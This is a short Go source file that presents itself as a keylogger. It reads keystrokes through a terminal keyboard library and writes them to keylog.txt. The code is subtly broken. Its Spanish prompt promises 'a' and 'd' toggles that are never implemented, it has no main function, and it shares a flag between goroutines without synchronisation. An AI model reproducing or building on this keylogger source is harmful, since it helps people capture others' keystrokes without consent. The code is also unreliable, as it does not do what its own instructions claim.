
package main
	
import (
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"
	"github.com/eiannone/keyboard"
)

func keylogger() {
	err := keyboard.Open()
	if err != nil {
		log.Fatal(err)
	}
	defer keyboard.Close()

	file, err := os.Create("keylog.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	isActive := true

	go func() {
		for {
			char, key, err := keyboard.GetKey()
			if err != nil {
				log.Fatal(err)
			}
			if isActive {
				if key == keyboard.KeyEsc {
					break
				}
				

				_, err := file.WriteString(fmt.Sprintf("%s", string(char)))
				if err != nil {
					log.Println(err)
				}
			}
		}
	}()

	fmt.Println("Presiona 'a' para activar, 'd' para desactivar, o Esc para salir.")

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	isActive = false

	time.Sleep(1 * time.Second)
}


